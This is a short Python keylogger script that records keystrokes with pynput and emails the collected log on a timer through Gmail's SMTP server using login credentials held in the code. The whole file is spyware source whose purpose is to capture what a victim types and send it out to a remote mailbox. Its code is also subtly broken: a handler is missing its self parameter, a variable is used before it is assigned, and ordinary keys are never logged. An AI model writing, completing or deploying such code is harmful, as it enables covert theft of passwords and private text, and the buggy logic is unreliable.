#!/usr/bin/env python

import pynput.keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = " Keylogger started!"
        self.interval = time_interval
        self.email = email
        self.password = password
    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(key):
        try:
            current_key = str(key.char)
            # char will only accept character keys so we are using a try block.
        except AttributeError:
            if key == key.space:
                current_key = current_key + " "
            else:
                current_key = current_key + " " + str(key) + " "
            self.append_to_log(current_key)
    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        # We are creating an email server instance.
        # This is google smtp server open to use which runs on the port 587.
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email,message)
        # We are sending the message from our own email again to our own email.
        server.quit()
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
